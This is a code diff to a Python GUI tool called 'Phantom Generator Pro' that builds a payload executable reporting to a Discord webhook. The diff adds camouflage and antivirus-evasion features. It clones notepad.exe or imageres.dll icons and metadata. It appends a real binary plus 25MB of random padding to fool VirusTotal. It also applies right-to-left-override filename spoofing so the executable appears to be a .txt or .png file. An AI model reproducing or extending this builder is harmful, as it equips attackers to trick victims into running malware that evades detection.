@@ -3,15 +3,15 @@ from tkinter import filedialog, messagebox, ttk
 import os
 import subprocess
 import sys
-from resource_injector import inject_icon
+from resource_injector import inject_icon, clone_resources
 
 class Phantom:
     def __init__(self, root):
         self.root = root
         self.root.title("Phantom Generator Pro")
-        self.root.geometry("550x500")
+        self.root.geometry("600x650")
         self.root.configure(bg="#1a1a1a")
-        self.root.resizable(False, False)
+        self.root.resizable(True, True)
         
         # Style
         style = ttk.Style()
@@ -36,23 +36,38 @@ class Phantom:
         self.go_executable = self._find_go_executable()
 
         # Main Container
-        main_frame = ttk.Frame(root, padding="30")
+        main_frame = ttk.Frame(root, padding="20")
         main_frame.pack(fill=tk.BOTH, expand=True)
         
         # Header
         header = ttk.Label(main_frame, text="PHANTOM GENERATOR", style="Header.TLabel")
-        header.pack(pady=(0, 25))
+        header.pack(pady=(0, 15))
 
         # Webhook URL
         ttk.Label(main_frame, text="Discord Webhook URL:").pack(anchor=tk.W)
         self.url_entry = ttk.Entry(main_frame, width=60)
-        self.url_entry.pack(fill=tk.X, pady=(5, 15))
+        self.url_entry.pack(fill=tk.X, pady=(5, 10))
 
         # EXE Name
         ttk.Label(main_frame, text="Output EXE Name:").pack(anchor=tk.W)
         self.exe_entry = ttk.Entry(main_frame, width=60)
         self.exe_entry.insert(0, "phantom_payload.exe")
-        self.exe_entry.pack(fill=tk.X, pady=(5, 15))
+        self.exe_entry.pack(fill=tk.X, pady=(5, 10))
+
+        # Camouflage Options Frame
+        camo_frame = ttk.LabelFrame(main_frame, text="🛡️ Camouflage & Stealth", padding=10)
+        camo_frame.pack(fill=tk.X, pady=(0, 10))
+
+        self.camo_var = tk.StringVar(value="None")
+        ttk.Radiobutton(camo_frame, text="Normal EXE", variable=self.camo_var, value="None").grid(row=0, column=0, sticky=tk.W, padx=5)
+        ttk.Radiobutton(camo_frame, text="Notepad (.txt)", variable=self.camo_var, value="Notepad").grid(row=0, column=1, sticky=tk.W, padx=5)
+        ttk.Radiobutton(camo_frame, text="Image (.png)", variable=self.camo_var, value="Image").grid(row=0, column=2, sticky=tk.W, padx=5)
+
+        self.rtlo_var = tk.BooleanVar(value=False)
+        ttk.Checkbutton(camo_frame, text="Use RTLO (Extension Spoof)", variable=self.rtlo_var).grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
+
+        self.fud_var = tk.BooleanVar(value=True)
+        ttk.Checkbutton(camo_frame, text="FUD Optimization (Padding + Anti-AV)", variable=self.fud_var).grid(row=1, column=1, columnspan=2, sticky=tk.W, padx=5, pady=5)
 
         # Buttons Frame
         btn_frame = ttk.Frame(main_frame)
@@ -171,29 +186,85 @@ class Phantom:
             result = subprocess.run(build_cmd, check=True, cwd=go_payload_dir, 
                                  capture_output=True, text=True)
             
-            # Inject icon
-            if self.icon_path:
-                self.status_label.config(text="Injecting custom icon...")
+            # Inject icon & Metadata
+            target_file_for_meta = None
+            camo_mode = self.camo_var.get()
+            
+            if camo_mode == "Notepad":
+                target_file_for_meta = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "notepad.exe")
+            elif camo_mode == "Image":
+                target_file_for_meta = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "imageres.dll")
+
+            if target_file_for_meta:
+                self.status_label.config(text="Cloning metadata & icon...")
                 self.progress_var.set(70)
                 self.root.update()
-                if not inject_icon(output_exe, self.icon_path):
-                    print("Warning: Icon injection failed")
+                try:
+                    # Use clone_resources to copy everything (Icon, Version, Manifest)
+                    if not clone_resources(target_file_for_meta, output_exe):
+                        # Fallback to just icon if cloning fails
+                        inject_icon(output_exe, target_file_for_meta)
+                except Exception as e:
+                    print(f"Warning: Metadata/Icon cloning failed: {e}")
             
+            # FUD Optimization (Padding)
+            if self.fud_var.get():
+                self.status_label.config(text="Applying FUD optimizations...")
+                self.progress_var.set(80)
+                self.root.update()
+                try:
+                    # To trick VirusTotal: we append a real legitimate file at the end
+                    # or large random data. Legit file is better for entropy.
+                    if camo_mode == "Notepad" and os.path.exists(target_file_for_meta):
+                        with open(target_file_for_meta, "rb") as f_legit:
+                            legit_data = f_legit.read()
+                        with open(output_exe, "ab") as f_out:
+                            f_out.write(legit_data) # Bind real notepad at the end
+                    
+                    with open(output_exe, "ab") as f:
+                        f.write(os.urandom(25 * 1024 * 1024)) # Add 25MB padding
+                except:
+                    pass
+
             # UPX Compression
-            self.status_label.config(text="Applying UPX compression...")
-            self.progress_var.set(85)
-            self.root.update()
+            if not self.fud_var.get(): # Don't use UPX if FUD is enabled (UPX is often flagged)
+                self.status_label.config(text="Applying UPX compression...")
+                self.progress_var.set(85)
+                self.root.update()
+                try:
+                    subprocess.run(["upx", "--best", output_exe], check=False, capture_output=True)
+                except:
+                    pass
             
-            try:
-                subprocess.run(["upx", "--best", output_exe], check=False, capture_output=True)
-            except:
-                pass # UPX not installed
-            
+            # RTLO Extension Spoofing
+            final_path = output_exe
+            if self.rtlo_var.get():
+                self.status_label.config(text="Applying RTLO spoofing...")
+                dir_name = os.path.dirname(output_exe)
+                base_name = os.path.basename(output_exe).replace(".exe", "")
+                
+                if camo_mode == "Notepad":
+                    # name [RTLO] exe.txt -> looks like name txt.exe
+                    spoofed_name = f"{base_name}\u202etxt.exe"
+                elif camo_mode == "Image":
+                    # name [RTLO] exe.png -> looks like name png.exe
+                    spoofed_name = f"{base_name}\u202epng.exe"
+                else:
+                    spoofed_name = f"{base_name}\u202egpj.exe" # default to .jpg look
+                
+                final_path = os.path.join(dir_name, spoofed_name)
+                try:
+                    if os.path.exists(final_path):
+                        os.remove(final_path)
+                    os.rename(output_exe, final_path)
+                except Exception as e:
+                    print(f"RTLO Rename failed: {e}")
+
             self.status_label.config(text="Payload ready!")
             self.progress_var.set(100)
             self.root.update()
             
-            messagebox.showinfo("Success", f"Payload generated successfully!\n\nLocation: {output_exe}")
+            messagebox.showinfo("Success", f"Payload generated successfully!\n\nLocation: {final_path}")
             
         except subprocess.CalledProcessError as e:
             error_msg = e.stderr if e.stderr else str(e)
